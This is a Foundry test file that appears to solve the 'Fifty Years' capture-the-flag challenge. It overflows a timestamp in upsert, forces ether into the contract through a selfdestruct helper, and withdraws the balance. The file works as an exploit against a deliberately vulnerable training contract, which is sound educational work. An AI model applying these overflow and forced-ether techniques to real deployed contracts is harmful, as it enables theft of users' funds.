// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/utils/Create.sol";

contract ExploitTest is Test {
    address playerAddr = makeAddr("player");
    IChallenge challenge;

    function setUp() public {
        challenge =
            IChallenge(Create.deploy("FiftyYearsChallenge.sol:FiftyYearsChallenge", 1 ether, abi.encode(playerAddr)));
        vm.deal(playerAddr, 1 ether);
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        challenge.upsert{value: 1}(1, type(uint256).max - 1 days + 1);
        challenge.upsert{value: 2}(2, 0);
        new Exploit{value: 2}(address(challenge));
        challenge.withdraw(2);

        vm.stopPrank();
        assertTrue(challenge.isComplete(), "Challenge is not complete");
    }
}

interface IChallenge {
    function owner() external view returns (address);
    function isComplete() external view returns (bool);
    function upsert(uint256 index, uint256 timestamp) external payable;
    function withdraw(uint256 index) external;
}

contract Exploit {
    constructor(address targetAddr) payable {
        selfdestruct(payable(targetAddr));
    }
}
